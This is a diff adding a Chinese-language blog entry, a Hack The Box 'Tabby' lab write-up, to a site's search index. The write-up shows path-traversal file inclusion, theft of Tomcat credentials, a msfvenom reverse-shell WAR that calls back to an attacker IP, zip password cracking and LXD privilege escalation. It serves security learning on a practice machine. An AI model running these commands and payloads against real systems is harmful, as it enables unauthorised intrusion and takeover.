@@ -1,6 +1,49 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>HTB-tabby</title>
+    <url>/2020/08/24/HTB-tabby/</url>
+    <content><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -T5 10.10.10.194 -oN nmap.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200823210641296.png#pic_center" alt="在这里插入图片描述"></p>
+<h1 id="站点文件包含"><a href="#站点文件包含" class="headerlink" title="站点文件包含"></a>站点文件包含</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加主机解析</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"10.10.10.194 megahosting.htb"</span>&gt;&gt;/etc/hosts</span><br></pre></td></tr></table></figure>
+<p>发现存在文件包含漏洞</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://megahosting.htb/news.php?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200823210856625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>对10.10.10.194:8080进行wfuzz</p>
+<p><img src="https://img-blog.csdnimg.cn/20200823212242638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>XXX/tomcat-users.xml的文件会存在 账户密码<br><img src="https://img-blog.csdnimg.cn/20200823212300662.png#pic_center" alt="在这里插入图片描述"><br>故</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -u  <span class="string">"http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml"</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hh 0</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200823212517765.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200823212529785.png#pic_center" alt="在这里插入图片描述"><br>由tomcat-users.xmltomcat文件可知tomcat只有admin-gui,manager-script两个角色<br>没有manager-gui角色<br>故无法登陆<a href="http://10.10.10.194/manager/html" target="_blank" rel="noopener">http://10.10.10.194/manager/html</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manager-gui — Access to the HTML interface.</span><br><span class="line">manager-status — Access to the <span class="string">"Server Status"</span> page only.</span><br><span class="line">manager-script — Access to the tools-friendly plain text interface that is described <span class="keyword">in</span> this document, and to the <span class="string">"Server Status"</span> page.</span><br><span class="line">manager-jmx — Access to JMX proxy interface and to the <span class="string">"Server Status"</span> page.</span><br><span class="line"></span><br><span class="line">admin-gui - use this role <span class="keyword">for</span> the graphical web interface.</span><br><span class="line">admin-script - use this role <span class="keyword">for</span> the scripting web interface.</span><br></pre></td></tr></table></figure>
+<p>使用<a href="https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/" target="_blank" rel="noopener">host-manager</a>添加虚拟主机失败 [但是tomcat又存在admin-gui角色，或许可以部署成功….]</p>
+<p>发现存在manager-script角色，可使用<a href="https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script" target="_blank" rel="noopener">curl命令上传文件</a>部署shell</p>
+<ul>
+<li>为什么部署在<a href="http://localhost:8080/manager/text/deploy?path=下？" target="_blank" rel="noopener">http://localhost:8080/manager/text/deploy?path=下？</a><br>由官方文档可知 <img src="https://img-blog.csdnimg.cn/20200824112834828.png#pic_center" alt="在这里插入图片描述"><h2 id="shell生成"><a href="#shell生成" class="headerlink" title="shell生成"></a>shell生成</h2></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#msfvenom -l payloads |grep reverse_tcp #查看某一payload</span></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.51 lport=4444 -f war &gt; get.war</span><br></pre></td></tr></table></figure>
+<h2 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -f -T get.war -u <span class="string">'tomcat:$3cureP4s5w0rd123!'</span> <span class="string">"http://10.10.10.194:8080/manager/text/deploy?path=/get.war"</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">#查看shell上传是否成功</span></span><br><span class="line">http://10.10.10.194:8080/manager/text/list</span><br></pre></td></tr></table></figure>
+<h2 id="侦听4444端口，获得shell"><a href="#侦听4444端口，获得shell" class="headerlink" title="侦听4444端口，获得shell"></a>侦听4444端口，获得shell</h2><p><img src="https://img-blog.csdnimg.cn/20200824114726279.png#pic_center" alt="在这里插入图片描述"></p>
+<h1 id="文件爆破"><a href="#文件爆破" class="headerlink" title="文件爆破"></a>文件爆破</h1><p><img src="https://img-blog.csdnimg.cn/20200824115913845.png#pic_center" alt="在这里插入图片描述"><br>文件下载</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.10.10.194/files/16162020_backup.zip</span><br></pre></td></tr></table></figure>
+<p>文件爆破</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip</span><br></pre></td></tr></table></figure>
+<p>获得ash密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tomcat@tabby:/home$ su ash</span><br><span class="line">su ash</span><br><span class="line">Password: admin@it</span><br><span class="line">ash@tabby:/home$ whoami</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a>脚本枚举</p>
+<h2 id="LXD提权"><a href="#LXD提权" class="headerlink" title="LXD提权"></a>LXD提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#攻击机</span></span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line"></span><br><span class="line"><span class="comment">#目标机</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz</span><br><span class="line"><span class="comment">#创建容器，并指定别名 myimage</span></span><br><span class="line">lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --<span class="built_in">alias</span> myimage</span><br><span class="line">lxc image list</span><br><span class="line">lxc init myimage ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line"><span class="comment">#挂载 /mnt/root </span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"><span class="built_in">cd</span> /mnt/root/root</span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.freebuf.com/articles/system/216803.html" target="_blank" rel="noopener">参考链接</a></p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul>
+<li>若存在admin-script角色，使用命令部署</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Example command:</span></span><br><span class="line">curl -u <span class="built_in">test</span>:<span class="built_in">test</span> http://localhost:8080/host-manager/text/add?name=www.awesomeserver.com&amp;aliases=awesomeserver.com&amp;appBase/mnt/appDir&amp;deployOnStartup=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>多阅读官方文档</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
     <title>Windows--Wmic_Get-CimInstance</title>
     <url>/2020/08/21/Windows--Wmic_Get-CimInstance/</url>
     <content><![CDATA[<h1 id="什么是WMIC"><a href="#什么是WMIC" class="headerlink" title="什么是WMIC"></a>什么是WMIC</h1><p>WMI的全名为“Windows Management Instrumentation”。从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。</p>
